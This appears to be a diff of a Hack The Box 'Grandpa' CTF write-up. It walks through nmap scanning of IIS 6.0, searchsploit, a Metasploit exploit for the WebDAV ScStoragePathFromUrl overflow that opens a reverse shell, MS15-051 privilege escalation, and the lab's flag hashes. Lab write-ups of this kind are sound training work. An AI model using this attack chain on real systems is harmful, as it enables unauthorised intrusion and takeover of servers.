@@ -4,17 +4,22 @@
 
 
 ```{r, engine='bash', count_lines}
-nmap -sS -sV 10.10.10.14
+nmap -T4 -A -v 10.10.10.14
 
-Nmap scan report for 10.10.10.14
-Host is up (0.15s latency).
-Not shown: 999 filtered ports
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Microsoft IIS httpd 6.0
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Date: Thu, 19 Oct 2017 15:38:04 GMT
+|   WebDAV type: Unkown
+|   Server Type: Microsoft-IIS/6.0
+|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 18.41 seconds
 ```
 
 
@@ -35,6 +40,7 @@ Information we have so far:
 There is a good chance that a known exploit would work because of the misconfiguration
 
 Searching exploits for IIS 6.0 
+
 ```{r, engine='bash', count_lines}
 root@kali:~/Hackthebox/Machines/Grandpa# searchsploit IIS 6.0 | grep -v "5.0"
 --------------------------------------------------------------- ----------------------------------
@@ -52,7 +58,10 @@ Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Buffer Overf | windows/remote/
 --------------------------------------------------------------- ----------------------------------
 ```
 
-We select the latest exploit and give a check if its present in Metasploit as well.
+'ScStoragePathFromUrl' exploit :
+>Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with "If: <http://" in a PROPFIND request, as exploited in the wild in July or August 2016.
+
+We already have info from nmap that the PROPFIND request is supported. So it would not be a long shit trying this one out.
 
 ```{r, engine='bash', count_lines}
 msf > search ScStoragePathFromUrl
@@ -104,7 +113,7 @@ Exploit target:
 And there you have it!!
 
 Easier than expected
-```
+```{r, engine='bash', count_lines}
 msf exploit(iis_webdav_scstoragepathfromurl) > exploit
 [*] Started reverse TCP handler on 10.10.14.248:4444 
 [*] Sending stage (171583 bytes) to 10.10.10.14
@@ -162,7 +171,7 @@ We still get Access Denied, Time to use the exploit suggester
 ```
 
 After trying a few of the suggested exploits, this one worked
-```
+```{r, engine='bash', count_lines}
 msf exploit(ms15_051_client_copy_image) > show options
 
 Module options (exploit/windows/local/ms15_051_client_copy_image):
@@ -204,7 +213,7 @@ meterpreter >
 ```
 
 **user.txt**
-```
+```{r, engine='bash', count_lines}
 C:\Documents and Settings\Harry\Desktop>type user.txt
 type user.txt
 bdff5ec67c3cff017f2bedc146a5d869
@@ -212,7 +221,7 @@ bdff5ec67c3cff017f2bedc146a5d869
 
 
 **root.txt**
-```
+```{r, engine='bash', count_lines}
 C:\Documents and Settings\Administrator\Desktop>type root.txt
 type root.txt
 9359e905a2c35f861f6a57cecf28bb7b
